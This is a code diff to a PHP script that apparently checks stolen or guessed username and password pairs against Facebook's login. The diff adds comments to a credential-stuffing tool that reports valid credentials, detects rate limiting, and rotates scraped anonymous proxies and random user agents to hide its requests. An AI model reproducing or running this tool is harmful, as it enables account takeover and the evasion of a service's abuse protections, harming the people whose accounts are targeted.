@@ -118,6 +118,8 @@ if (contains("login_error",$results) | contains("Error",$results))
 
 
 }
+
+// ACCOUNT DISABLED CHECK
 if (contains("Your account has been disabled",$results))
        {
          $errorMsg="Account Disabled";
@@ -125,12 +127,15 @@ if (contains("Your account has been disabled",$results))
          return "Login Successful,\nProxy : (".$proxy.")\nUsername : (".$username.")\nPassword : (".$password.")\nMessage : ".$errorMsg;
        } 
 
+// CATCH ADD NUMBER PAGE
 if (contains("Add a mobile number",$results))
        {
          $errorMsg="Add Number Page Hit";
          file_put_contents($cookieFile, " ");
          return "Login Successful,\nProxy : (".$proxy.")\nUsername : (".$username.")\nPassword : (".$password.")\nMessage : ".$errorMsg;
        } 
+
+// CHECK PROXY RATE LIMIT
 if (contains("https://www.facebook.com/help/177066345680802",$results))
  {
        $errorMsg="Rate Limited";
@@ -155,6 +160,7 @@ return "Login Successful,\nProxy : (".$proxy.")\nUsername : (".$username.")\nPas
 
 }
 
+// SHOW HTML FOR DEBUGGING ON UNKNOWN ERROR
 if(strlen($errorMsg) < 1)
 {
    $errorMsg = $results;
@@ -173,13 +179,14 @@ function contains($search, $input)
 }
 
 
-
+// RANDOM PROXY FUNCTION
 function randomProxy()
 {
   $proxies = file('proxy.list');
   return trim($proxies[array_rand($proxies,1)]);
 }
 
+// LOAD PROXY INFORMATION FROM PROXY SCRAPE
 function updateProxies()
 {
   $newProxies = file_get_contents("https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=6000&country=all&ssl=yes&anonymity=anonymous");
@@ -189,12 +196,14 @@ function updateProxies()
   }
 }
 
+// OBFUSCATE REQUEST WITH DIFFERENT USER AGENT
 function randomAgent()
 {
    $agents = file('agent.list');
    return trim($agents[array_rand($agents,1)]);
 }
 
+// CHECK POST & GET FOR PARAMETERS
 function hasParam($param) 
 {
    return array_key_exists($param, $_REQUEST);
